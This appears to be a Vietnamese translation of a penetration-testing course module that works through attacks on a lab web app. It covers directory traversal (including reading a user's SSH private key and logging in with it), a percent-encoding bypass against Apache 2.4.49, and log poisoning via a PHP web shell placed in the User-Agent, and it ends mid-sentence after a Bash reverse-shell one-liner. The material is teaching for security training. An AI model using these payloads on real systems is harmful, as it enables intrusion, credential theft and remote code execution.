# Common Web Application Attacks

# Các cuộc tấn công Web Application phổ biến

---

Trong **Learning Module** này, chúng ta sẽ học các **Learning Unit** sau:

- **Directory Traversal** (duyệt/thăm dò thư mục trái phép)
- **File Inclusion Vulnerabilities** (lỗ hổng chèn/tải tệp – LFI/RFI)
- **File Upload Attack Vulnerabilities** (lỗ hổng tải tệp lên)
- **Command Injection** (chèn lệnh hệ thống)

Phát triển web hiện là một trong những kỹ năng được săn đón nhất trong lĩnh vực IT. Sự kết hợp giữa việc thiếu hụt lập trình viên web có tay nghề, áp lực thời gian của dự án và công nghệ thay đổi nhanh chóng khiến một số lỗ hổng nhất định lặp đi lặp lại trên rất nhiều ứng dụng web. Bất kể **technology stack** bên dưới là gì, nhiều ứng dụng đang triển khai ngoài thực tế vẫn tồn tại các lỗ hổng phổ biến.

Trong Module này, chúng ta sẽ tìm hiểu bốn kiểu tấn công web thường gặp. Trước tiên là **Directory Traversal** và **File Inclusion**. Tiếp theo, ta sẽ học cách khai thác **lỗ hổng tải tệp lên** với cả tệp thực thi và không thực thi. Cuối cùng, chúng ta sẽ khám phá **tấn công chèn lệnh (Command Injection)**.

---

# 1. Directory Traversal

---

**Learning Unit** này bao gồm các **Mục tiêu học tập** sau:

- Hiểu **đường dẫn tuyệt đối** và **đường dẫn tương đối**
- Học cách **khai thác lỗ hổng Directory Traversal**
- **Mã hóa (encoding)** các ký tự đặc biệt

Trong Learning Unit này, chúng ta sẽ xem xét các lỗ hổng **Directory Traversal** (duyệt/thăm dò thư mục trái phép). Trước khi tìm hiểu cách khai thác loại lỗ hổng này, chúng ta cần nắm rõ khái niệm **đường dẫn tương đối** và **đường dẫn tuyệt đối**. Chúng ta cũng sẽ sử dụng **mã hóa các ký tự đặc biệt** để thực hiện tấn công Directory Traversal.

---

## 1.1. Đường dẫn tuyệt đối vs tương đối

---

Trong phần này, ta sẽ học sự khác nhau giữa **đường dẫn tuyệt đối** và **đường dẫn tương đối**. Để khai thác thành công các lỗ hổng sẽ gặp trong Module này, ta cần chỉ ra đường dẫn đến các tệp muốn **hiển thị, tải lên, include (chèn), hoặc thực thi**. Tùy vào ứng dụng web và kiểu lỗ hổng, ta sẽ dùng đường dẫn tuyệt đối hoặc tương đối. Việc hiểu rõ sự khác nhau và cách dùng của chúng để chỉ định đường dẫn tệp là **rất quan trọng**.

Để tham chiếu một **đường dẫn tuyệt đối**, ta chỉ định đầy đủ đường dẫn hệ thống tệp (file system) bao gồm mọi thư mục con. Ta có thể dùng đường dẫn tuyệt đối từ **bất kỳ vị trí** nào trong hệ thống tệp. Trên Linux, đường dẫn tuyệt đối **bắt đầu bằng dấu gạch chéo “/”**, tức là tính từ **root filesystem**. Từ đó, ta có thể điều hướng qua các thư mục trong hệ thống tệp.

Hãy dùng **đường dẫn tuyệt đối** để hiển thị nội dung một tệp. Bắt đầu tại đường dẫn `/home/kali/`, ta sẽ hiển thị nội dung của `/etc/passwd`.

Trước hết, ta đang ở thư mục home của người dùng `kali` với lệnh `pwd`. Lệnh thứ hai, `ls /`, liệt kê tất cả tệp và thư mục ở **root filesystem**; đầu ra cho thấy có thư mục `etc`. Bằng cách đặt dấu `/` trước `etc` ở lệnh thứ ba, ta dùng một **đường dẫn tuyệt đối** tính từ root. Điều này có nghĩa `/etc/passwd` có thể được dùng **từ mọi vị trí** trong hệ thống tệp. Nếu bỏ dấu `/` đầu (tức viết `etc/passwd`), terminal sẽ tìm `etc` **ngay trong** thư mục home của `kali` (vì đó là thư mục làm việc hiện tại).

```
kali@kali:~$ pwd
/home/kali

kali@kali:~$ ls /
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var

kali@kali:~$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```

                                   *Liệt kê 1 – Hiển thị nội dung `/etc/passwd` bằng đường dẫn tuyệt đối*

Tiếp theo, hãy dùng **đường dẫn tương đối** để đạt cùng mục tiêu: hiển thị nội dung `/etc/passwd` từ thư mục home của `kali`. Để **lùi lại một thư mục**, dùng `../`. Để **lùi nhiều hơn một cấp**, kết hợp nhiều lần `../`.

Ta có thể dùng `ls` kèm một `../` để liệt kê nội dung của thư mục `/home` (vì `../` nghĩa là lùi về **một cấp**). Sau đó dùng **hai** lần `../` để liệt kê nội dung của **root filesystem**, nơi có thư mục `etc`.

```
kali@kali:~$ pwd
/home/kali

kali@kali:~$ ls ../
kali

kali@kali:~$ ls ../../
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
```

                                             *Liệt kê 2 – Dùng `../` để quay về root filesystem*

Từ đây, ta có thể điều hướng như bình thường. Ta thêm `etc` sau **hai** lần `../` để liệt kê mọi tệp/thư mục trong đường dẫn tuyệt đối `/etc`. Ở lệnh cuối, ta dùng `cat` để hiển thị nội dung tệp `passwd` bằng cách kết hợp đường dẫn tương đối `../../etc/passwd`.

```
kali@kali:~$ ls ../../etc
adduser.conf            debian_version  hostname        logrotate.d     passwd
...
logrotate.conf  pam.d           rmt          sudoers       zsh

kali@kali:~$ cat ../../etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```

                                       *Liệt kê 3 – Hiển thị `/etc/passwd` bằng đường dẫn tương đối*

Xem thêm một ví dụ khác: trong khi ta có thể dùng `cat ../../etc/passwd` như ở *Liệt kê 3*, ta **vẫn có thể** đạt kết quả tương tự bằng cách thêm **nhiều** lần `../`.

```
kali@kali:~$ cat ../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```

                                          *Liệt kê 4 – Thêm nhiều `../` vào đường dẫn tương đối*

Số lần lặp `../` **chỉ còn ý nghĩa** cho đến khi ta chạm tới **root filesystem**. Về lý thuyết, ta có thể thêm **bao nhiêu** `../` cũng được, vì từ `/` không thể lùi thêm nữa. Điều này hữu ích trong một số tình huống, chẳng hạn khi **không biết thư mục làm việc hiện tại (cwd)**; khi đó, ta có thể chỉ định **rất nhiều** `../` để đảm bảo đi ngược về root theo góc nhìn đường dẫn tương đối.

---

## 1.2. Nhận diện và khai thác Directory Traversal

---

Trong phần này, ta sẽ tìm hiểu các cuộc tấn công **Directory Traversal** (còn gọi là **path traversal**). Kiểu tấn công này có thể được dùng để truy cập các tệp nhạy cảm trên máy chủ web và thường xảy ra khi ứng dụng web **không khử/kiểm soát dữ liệu đầu vào** của người dùng.

Để hiển thị một trang cụ thể, máy chủ web sẽ lấy tệp từ hệ thống tệp. Các tệp này nằm trong **thư mục gốc web (web root)** hoặc một thư mục con của nó. Trên Linux, thư mục `/var/www/html/` thường được dùng làm web root. Khi ứng dụng web hiển thị một trang, ví dụ `http://example.com/file.html`, máy chủ sẽ cố truy cập `/var/www/html/file.html`. Liên kết HTTP không chứa phần đường dẫn nào ngoài tên tệp vì **web root đóng vai trò thư mục gốc** của máy chủ web. Nếu ứng dụng có lỗ hổng directory traversal, người dùng có thể dùng **đường dẫn tương đối** để đi ra ngoài web root, từ đó truy cập các tệp nhạy cảm như khóa riêng SSH hoặc tệp cấu hình.

Dù hiểu cách khai thác **Directory Traversal** là quan trọng, ta cũng cần biết **cách nhận diện** chúng. Hãy luôn kiểm tra lỗ hổng bằng cách rê chuột lên tất cả các nút, kiểm tra mọi liên kết, duyệt qua mọi trang có thể truy cập, và (nếu có thể) xem **mã nguồn HTML** của trang. **Các liên kết** đặc biệt hữu ích vì chúng thường cung cấp tham số hoặc dữ liệu về ứng dụng.

Ví dụ, nếu ta thấy liên kết sau, ta có thể rút ra nhiều thông tin quan trọng:

```
https://example.com/cms/login.php?language=en.html
```

                                                                    *Liệt kê 5 – Ví dụ về một liên kết*

- Thứ nhất, `login.php` cho ta biết ứng dụng web dùng **PHP**. Từ đó ta có thể đưa ra giả định về cách ứng dụng hoạt động, hữu ích cho giai đoạn khai thác.
- Thứ hai, URL chứa tham số `language` với **một trang HTML** làm giá trị. Trong tình huống này, ta nên thử truy cập trực tiếp tệp đó (`https://example.com/cms/en.html`). Nếu mở được, ta xác nhận `en.html` **là tệp trên máy chủ**, nghĩa là có thể dùng tham số này để thử các tên tệp khác. Hãy luôn chú ý các tham số có **giá trị là tên tệp**.
- Thứ ba, URL chứa thư mục `cms`. Điều này cho thấy ứng dụng web **chạy trong một thư mục con** của web root.

Tiếp theo là một nghiên cứu tình huống. Ta sẽ xem ứng dụng **Mountain Desserts**. Để truy cập, cần cập nhật tệp `/etc/hosts` trên máy Kali để dùng tên miền DNS. Lưu ý IP của máy mục tiêu trong lab có thể thay đổi.

```
127.0.0.1       localhost
127.0.1.1       kali
192.168.50.16   mountaindesserts.com
...
```

                                                              *Liệt kê 6 – Nội dung `/etc/hosts`*

Ta sẽ dùng hostname này cho phần demo hiện tại và phần tiếp theo. Truy cập ứng dụng tại:

`http://mountaindesserts.com/meteor/index.php`.

![image.png](image.png)

                                       ***Hình 1: Ứng dụng Single Page “Mountain Desserts”***

Sau khi mở trên trình duyệt (Hình 1), thanh điều hướng hiển thị tệp `index.php`, nên có thể kết luận ứng dụng dùng **PHP**. Để thu thập thêm thông tin về cấu trúc trang, ta nên **rê chuột lên tất cả nút và liên kết**, ghi nhận các tham số và các trang khác nhau mà chúng dẫn tới.

![image.png](image%201.png)

                                                                     ***Hình 2: Rê chuột lên một nút***

Kéo xuống và rê chuột, ta sẽ thấy hầu hết liên kết **chỉ trỏ về chính trang đó**, như trong Hình 2.

Ở cuối trang có một liên kết **“Admin”**.

![image.png](image%202.png)

                                                           ***Hình 3: Rê chuột lên liên kết “Admin”***

Hình 3 hiển thị URL khi rê chuột lên “Admin”:

`http://mountaindesserts.com/meteor/index.php?page=admin.php`.

Ta biết ứng dụng dùng PHP và có tham số `page`, vậy có thể **tham số này dùng để hiển thị các trang khác nhau**. Trong PHP, các biến truy vấn GET được quản lý qua `$_GET`. Khi nhấp vào liên kết, ta nhận thông báo lỗi nói rằng trang đang bảo trì.

![image.png](image%203.png)

                                                      ***Hình 4: Thông báo lỗi của liên kết Admin***

Đây là chi tiết quan trọng vì cho thấy **nội dung được hiển thị trên cùng một trang**. Có thể ứng dụng được phát triển để **include** nội dung trang phụ ngay trong `index.php`. Ví dụ, khi mở `mountaindesserts.com/meteor/admin.php` trực tiếp trên trình duyệt, ta thấy **cùng một thông báo** như khi nhấp liên kết “Admin” từ `index.php`.

![image.png](image%204.png)

                                                     ***Hình 5: Thông báo bảo trì trang Admin***

Điều này cho thấy ứng dụng **nhúng nội dung** của trang thông qua tham số `page` và hiển thị nó dưới liên kết “Admin”. Bây giờ ta thử dùng `../` để **traversal** trong tham số có khả năng dễ tổn thương này. Ta sẽ chỉ định đường dẫn tương đối tới `/etc/passwd` để kiểm tra tham số `page`.

```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```

                                      *Liệt kê 7 – URL đầy đủ cho tấn công Directory Traversal*

Hãy sao chép URL ở *Liệt kê 7* vào thanh địa chỉ của trình duyệt.

![image.png](image%205.png)

                                         ***Hình 6: Ứng dụng hiển thị nội dung tệp `/etc/passwd`***

Hình 6 cho thấy nội dung `/etc/passwd`. Ta đã **khai thác thành công** lỗ hổng directory traversal bằng đường dẫn tương đối.

Lỗ hổng directory traversal **chủ yếu hữu ích để thu thập thông tin**. Như đã đề cập, nếu truy cập được các tệp nhạy cảm (mật khẩu, khóa…), ta có thể **dẫn tới truy cập hệ thống**.

Trong đa số trường hợp, web server chạy dưới ngữ cảnh một người dùng chuyên dụng như `www-data`. Những người dùng này thường bị **giới hạn quyền**. Tuy nhiên, đôi khi người dùng/quản trị **cố ý đặt quyền** đọc tệp khá thoáng (thậm chí “world-readable”), vì áp lực thời gian hoặc chương trình bảo mật chưa hoàn thiện. Do đó, ta **luôn nên kiểm tra** sự tồn tại và quyền truy cập của **khóa SSH**.

Khóa SSH thường nằm trong thư mục home của người dùng, trong thư mục `.ssh`. May mắn là `/etc/passwd` cũng chứa **đường dẫn thư mục home** của tất cả người dùng (như thấy ở Hình 6). Đầu ra `/etc/passwd` cho thấy có người dùng `offsec`. Ta hãy chỉ định đường dẫn tương đối trong tham số `page` để thử hiển thị **khóa riêng** của người dùng này:

```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

                                      *Liệt kê 8 – URL đầy đủ cho tấn công Directory Traversal*

Sao chép URL ở *Liệt kê 8* vào thanh địa chỉ.

![image.png](image%206.png)

                                                             ***Hình 7: Nội dung khóa riêng SSH***

Hình 7 cho thấy ta đã lấy được **private key** của `offsec`. Quan sát đầu ra, định dạng hiển thị hơi lộn xộn.

Khi đánh giá ứng dụng web, ngay khi phát hiện **dấu hiệu lỗ hổng** (như tham số `page` ở đây), ta **không nên dựa vào trình duyệt** để thử nghiệm, vì trình duyệt hay “tô vẽ”/tối ưu nội dung cho thân thiện người dùng. Hãy dùng **Burp**, **cURL** hoặc **ngôn ngữ lập trình** tùy chọn để kiểm thử.

Hãy dùng `curl` để lấy khóa riêng SSH giống như đã làm với trình duyệt:

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
...
lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
-----END OPENSSH PRIVATE KEY-----
...
```

                                                        *Liệt kê 9 – Khóa riêng SSH qua `curl`*

*Liệt kê 9* cho thấy dùng `curl` thì khóa riêng SSH được **định dạng “đẹp” hơn** so với trên trình duyệt. Tuy nhiên, **HTML** của trang cũng lẫn trong đầu ra. Hãy **sao chép phần khóa** từ `-----BEGIN OPENSSH PRIVATE KEY-----` tới `-----END OPENSSH PRIVATE KEY-----` và dán vào một tệp tên `dt_key` trong thư mục home của `kali`.

Bây giờ ta dùng **private key** này để kết nối SSH tới hệ thống mục tiêu qua **cổng 2222**. Dùng `-i` để chỉ định tệp khóa riêng và `-p` để chỉ định cổng. Trước khi dùng, cần chỉnh **quyền** của tệp `dt_key` để **chỉ chủ sở hữu** được đọc; nếu không, `ssh` sẽ báo lỗi **“quyền quá mở (too open)”**.

```
kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
...

kali@kali:~$ chmod 400 dt_key

kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
...
offsec@68b68f3eb343:~$
```

                                                   *Liệt kê 10 – Dùng private key để kết nối SSH*

Trước khi kết thúc, hãy lướt qua directory traversal trên **Windows**. Trên Linux, ta thường dùng tệp `/etc/passwd` để thử lỗ hổng. Trên Windows, có thể dùng tệp **`C:\Windows\System32\drivers\etc\hosts`** (mọi người dùng cục bộ đều đọc được). Bằng cách hiển thị tệp này, ta có thể **xác nhận lỗ hổng tồn tại** và hiểu cách ứng dụng hiển thị nội dung tệp. Sau khi xác nhận, hãy thử chỉ định **các tệp nhạy cảm** như tệp cấu hình và log.

Nhìn chung, **khó** lợi dụng directory traversal để truy cập hệ thống trên Windows hơn Linux. Trên Linux, một vector điển hình là: liệt kê người dùng bằng `/etc/passwd`, kiểm tra khóa riêng trong thư mục home của họ, rồi dùng SSH để vào hệ thống. Vector này **không áp dụng** cho Windows và **không có tương đương trực tiếp**. Ngoài ra, trên Windows thường **khó tìm** tệp nhạy cảm nếu **không liệt kê được thư mục**. Vì vậy, để xác định tệp nhạy cảm, ta cần **phân tích kỹ ứng dụng** và thu thập thông tin về **web server, framework, ngôn ngữ** đang dùng.

Khi đã có thông tin về ứng dụng/dịch vụ, ta có thể **tra cứu đường dẫn** dẫn tới tệp nhạy cảm. Ví dụ, nếu hệ thống chạy **Internet Information Services (IIS)**, ta có thể tra đường dẫn log và cấu trúc web root. Theo tài liệu Microsoft, log nằm ở `C:\inetpub\logs\LogFiles\W3SVC1\`. Một tệp luôn nên kiểm tra khi mục tiêu chạy IIS là **`C:\inetpub\wwwroot\web.config`**, có thể chứa thông tin nhạy cảm như **tên người dùng/mật khẩu**.

Trong phần này, ta đã dùng chuỗi `../` để traversal trên Linux. Như đã thấy, Windows dùng **backslash** cho đường dẫn. Do đó, `..\` là **biến thể quan trọng** thay cho `../` khi mục tiêu là Windows. Mặc dù **RFC 17387** quy định **luôn dùng dấu gạch chéo (/) trong URL**, thực tế có những ứng dụng web trên Windows **chỉ dễ tổn thương** với directory traversal dùng **backslash**. Vì vậy, khi kiểm tra ứng dụng web chạy trên Windows, hãy **thử cả hai**: dấu **gạch chéo `/`** và **backslash `\`**.

---

## 1.3. Mã hóa ký tự đặc biệt

---

Sau khi nắm chắc khái niệm **directory traversal** qua ứng dụng “Mountain Desserts”, giờ ta áp dụng vào một lỗ hổng thực tế. Trong chủ đề **Vulnerability Scanning**, ta đã quét máy **SAMBA** và phát hiện **lỗ hổng directory traversal trong Apache 2.4.49**. Lỗ hổng này có thể bị khai thác bằng cách dùng **đường dẫn tương đối** sau khi chỉ định thư mục **`cgi-bin`** trong URL.

Hãy dùng **curl** và nhiều chuỗi `../` để thử khai thác lỗ hổng này trên máy **WEB18** chạy Apache 2.4.49.

```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>

kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

                 *Liệt kê 11 – Dùng `../` để lợi dụng lỗ hổng Directory Traversal trên Apache 2.4.49*

*Liệt kê 11* cho thấy sau khi thử hai truy vấn với số lượng `../` khác nhau, ta **không** hiển thị được nội dung của `/etc/passwd` qua directory traversal. Bởi vì việc lợi dụng chuỗi `../` là cách lạm dụng hành vi ứng dụng **rất phổ biến**, nên chuỗi này thường bị **lọc** bởi **web server**, **WAF** (web application firewall), hoặc **bản thân ứng dụng**.

May mắn là ta có thể dùng **URL Encoding** (còn gọi là **Percent Encoding**) để **vượt qua** các bộ lọc này. Ta có thể dựa vào **bảng mã ASCII** để **tự mã hóa** truy vấn từ *Liệt kê 11* (hoặc dùng bộ chuyển đổi trực tuyến trên cùng trang). Trước mắt, ta chỉ **mã hóa dấu chấm**, ký hiệu là **`%2e`**.

```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```

                                 *Liệt kê 12 – Dùng “dấu chấm đã mã hóa” cho Directory Traversal*

Ta đã **thành công** dùng directory traversal với **dấu chấm mã hóa** để hiển thị nội dung của `/etc/passwd` trên máy mục tiêu.

Nhìn chung, **URL encoding** được dùng để chuyển các ký tự trong yêu cầu web sang định dạng có thể truyền qua Internet. Tuy nhiên, nó cũng thường bị **lạm dụng cho mục đích tấn công**. Lý do là **biểu diễn đã mã hóa** của ký tự trong yêu cầu **có thể bị bỏ sót** bởi các bộ lọc chỉ kiểm tra **dạng văn bản thuần** (ví dụ kiểm `../` nhưng **không** kiểm `%2e%2e/`). Sau khi yêu cầu **vượt qua bộ lọc**, ứng dụng hoặc máy chủ web sẽ **giải mã** và **diễn giải** các ký tự đã mã hóa như một yêu cầu hợp lệ.

---

# 2. Lỗ hổng File Inclusion

---

**Learning Unit** này có các **Mục tiêu học tập**:

- Phân biệt **File Inclusion** và **Directory Traversal**
- Hiểu bản chất lỗ hổng **File Inclusion**
- Nắm cách tận dụng **Local File Inclusion (LFI)** để đạt **thực thi mã**
- Tìm hiểu cách dùng **PHP wrappers**
- Học cách thực hiện tấn công **Remote File Inclusion (RFI)**

Trong Learning Unit này, chúng ta sẽ tìm hiểu các lỗ hổng **File Inclusion**. Ta sẽ minh họa cách khai thác **LFI** qua một nghiên cứu tình huống, đồng thời phân tích sự khác nhau giữa **File Inclusion** và **Directory Traversal**. Tiếp đó, ta học về **PHP Wrappers** — có thể dùng để **vượt lọc** và lách các ràng buộc khác. Cuối cùng, ta xem xét **Remote File Inclusion (RFI)**, cho phép **nhúng tệp** từ một hệ thống do chúng ta kiểm soát.

---

## 2.1. Local File Inclusion

---

Trước khi đi vào **Local File Inclusion (LFI)**, hãy dành chút thời gian phân biệt **File Inclusion** và **Directory Traversal**. Hai khái niệm này thường bị nhầm lẫn bởi pentester và cả chuyên gia bảo mật. Nếu xác định sai kiểu lỗ hổng, ta có thể bỏ lỡ cơ hội đạt **thực thi mã**.

Như đã nói ở Learning Unit trước, ta có thể dùng **directory traversal** để **đọc nội dung** một tệp nằm **ngoài web root** của máy chủ web. Còn **file inclusion** cho phép ta **“include/nhúng”** một tệp **vào mã đang chạy** của ứng dụng. Điều này có nghĩa là với file inclusion, ta có thể **thực thi** tệp **cục bộ** hoặc **từ xa**, trong khi directory traversal **chỉ đọc nội dung**. Vì lỗ hổng file inclusion cho phép nhúng tệp vào luồng thực thi, ta cũng có thể hiển thị nội dung của các tệp **không thực thi**. Ví dụ: nếu lợi dụng directory traversal trong ứng dụng PHP và chỉ định `admin.php`, **mã nguồn** file PHP sẽ được hiển thị. Ngược lại, với **file inclusion**, file `admin.php` sẽ **được thực thi**.

Trong ví dụ sau, mục tiêu của ta là đạt **Remote Code Execution (RCE)** thông qua lỗ hổng **LFI**. Ta sẽ sử dụng kỹ thuật **Log Poisoning**. Log Poisoning hoạt động bằng cách **chỉnh sửa dữ liệu** ta gửi tới ứng dụng để **log** ghi lại **đoạn mã thực thi**. Trong bối cảnh LFI, tệp cục bộ mà ta include sẽ **được thực thi** nếu nó **chứa nội dung thực thi**. Nghĩa là nếu ta ghi được mã thực thi vào một tệp, rồi include tệp đó trong luồng chạy, mã sẽ chạy.

Trong case study dưới đây, ta sẽ cố gắng ghi mã thực thi vào tệp log truy cập của Apache **`access.log`** trong thư mục **`/var/log/apache2/`**. Trước hết, cần xem **những thông tin nào do ta kiểm soát** và được Apache lưu vào log. Ở đây, “kiểm soát” nghĩa là ta **có thể sửa nội dung** trước khi gửi tới ứng dụng web. Ta có thể đọc tài liệu của **Apache web server** hoặc **hiển thị tệp log qua LFI**.

Hãy dùng `curl` để phân tích **các thành phần** của một bản ghi log bằng cách hiển thị `access.log` qua lỗ hổng directory traversal đã tìm trước đó. Nghĩa là ta dùng đường dẫn tương đối của tệp log trong tham số dễ tổn thương **`page`** của ứng dụng **“Mountain Desserts”**.

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```

                                        *Liệt kê 13 – Một dòng log trong `access.log` của Apache*

*Liệt kê 13* cho thấy **User-Agent** được ghi trong log. Trước khi gửi yêu cầu, ta có thể **chỉnh User-Agent trong Burp** để quy định **nội dung sẽ được ghi** vào `access.log`.

Ngoài tên tệp chỉ định, lệnh trên tương đương cuộc tấn công directory traversal ở Learning Unit trước. Điểm khác biệt chính giữa khai thác directory traversal và LFI là **cách xử lý tệp/nội dung thực thi**.

Mở **Burp**, bật trình duyệt, truy cập trang “Mountain Desserts”. Nhấn liên kết **Admin** ở cuối trang, quay lại Burp và mở tab **HTTP history**. Chọn request tương ứng và **Send to Repeater**.

![image.png](image%207.png)

                                         ***Hình 8: Request chưa chỉnh sửa trong Burp Repeater***

Giờ ta sẽ **sửa User-Agent** để **chèn đoạn code PHP** sau. Đoạn này nhận lệnh qua tham số `cmd` và thực thi trên hệ thống đích bằng hàm `system` của PHP. Ta dùng `echo` để hiển thị kết quả:

```php
<?php echo system($_GET['cmd']); ?>
```

                                                     *Liệt kê 14 – Đoạn PHP chèn vào User-Agent*

Sau khi sửa **User-Agent**, bấm **Send**.

![image.png](image%208.png)

                                                 ***Hình 9: Request đã chỉnh trong Burp Repeater***

Đoạn PHP đã được **ghi vào `access.log`** của Apache. Bằng cách **include** tệp log qua lỗ hổng LFI, ta có thể **thực thi** đoạn PHP.

Để chạy snippet, ta cập nhật tham số `page` trong request hiện tại bằng đường dẫn tương đối:

```
../../../../../../../../../var/log/apache2/access.log
```

                                             *Liệt kê 15 – Đường dẫn tương đối cho tham số `page`*

Ta cũng cần thêm tham số **`cmd`** vào URL để đưa lệnh cho đoạn PHP. Trước tiên, nhập lệnh **`ps`** để kiểm tra log poisoning đã hoạt động chưa. Vì cần truyền giá trị cho **hai tham số** (`page` cho đường dẫn log, `cmd` cho lệnh), ta dùng **dấu `&`** để phân tách. Đồng thời **xóa dòng User-Agent** trong request hiện tại để **không** ghi thêm một snippet PHP nữa vào log (tránh bị thực thi **nhiều lần**).

Hình tiếp theo hiển thị request cuối cùng ở phần **Request**. Sau khi gửi, cuộn xuống xem **Response**.

![image.png](image%209.png)

                                            ***Hình 10: Kết quả lệnh `ps` thông qua Log Poisoning***

Hình 10 cho thấy **kết quả lệnh `ps`** đã được ghi vào `access.log` nhờ đoạn PHP ta chèn.

Cập nhật tham số **`cmd`** thành `ls -la`.

![image.png](image%2010.png)

                                                                  ***Hình 11: Dùng lệnh có tham số***

Phần **Response** báo lỗi do có **dấu cách** giữa lệnh và tham số. Có nhiều kỹ thuật vượt qua như **IFS** hoặc **URL encoding**. Với URL encoding, một khoảng trắng là **`%20`**.

Thay **dấu cách** bằng **`%20`** rồi bấm **Send**.

![image.png](image%2011.png)

                                                     ***Hình 12: Mã hóa khoảng trắng bằng `%20`***

Hình 12 cho thấy lệnh đã chạy **chính xác**.

Ta đã đạt **thực thi lệnh** trên hệ thống đích; từ đây có thể tiếp tục **reverse shell** hoặc **thêm SSH key** vào `authorized_keys` của một người dùng.

Hãy thử **reverse shell** bằng cách đưa lệnh vào tham số `cmd`. Có thể dùng one-liner **Bash TCP reverse shell** thông dụng. (IP đích có thể phải đổi trong lab.)

```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

                                                        *Liệt kê 16 – One-liner Bash reverse shell*

Vì lệnh được thực thi qua hàm `system` của PHP, có thể nó chạy bằng Bourne Shell (`sh`) thay vì **Bash**. One-liner ở *Liệt kê 16* dùng cú pháp **không** hỗ trợ bởi `sh`. Để chắc chắn chạy bằng Bash, ta bọc one-liner làm **đối số** cho `bash -c`:

```
